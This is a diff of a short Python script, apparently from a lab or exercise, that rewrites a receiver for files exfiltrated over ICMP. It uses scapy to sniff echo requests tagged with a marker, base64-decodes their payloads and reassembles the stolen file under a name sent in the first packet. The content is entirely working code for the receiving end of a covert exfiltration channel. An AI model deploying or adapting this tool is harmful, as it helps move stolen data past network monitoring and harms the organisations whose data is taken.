@@ -1,20 +1,15 @@
-import base64
-import argparse
-from scapy.all import *
-parser = argparse.ArgumentParser(description="reception de fichiers exfiltrés")
-parser.add_argument('-f','--file', help='nom du fichier à recevoir',dest='file',type=str)
+#!/usr/bin/python3
 
-args = parser.parse_args()
-fichier=args.file
-if not args.file:
-    parser.print_help()
-    exit(1)
-filename = args.file
-with open(args.file, "wb") as f:
-  while True:
-      packet=sniff(filter="icmp[icmptype]==icmp-echo and ! icmp[8:4]==0x636f6b3f ",count=1)
-      b64_payload = packet[0][Raw].load
-      bytes_read = base64.b64decode(b64_payload)
-      if not bytes_read:
-          break
-      f.write(bytes_read)
+from scapy.all import *
+import base64
+
+file=sniff(filter='icmp[icmptype]=icmp-echo and icmp[8:4]=0x526a4673',count=1)
+file=file[0][Raw].load
+file=base64.b64decode(file.decode()).decode().split(":")[1]
+paquet=sniff(filter='icmp[icmptype]=icmp-echo and icmp[8:4]=0x526a4673',stop_filter=lambda p: p.haslayer(Padding))
+fichier=open(file,'ab')
+for i in range (0,len(paquet)-1):
+  octets=paquet[i][Raw].load
+  octets=octets.decode().split("=",1)[1]
+  test=base64.b64decode(octets)
+  fichier.write(test)
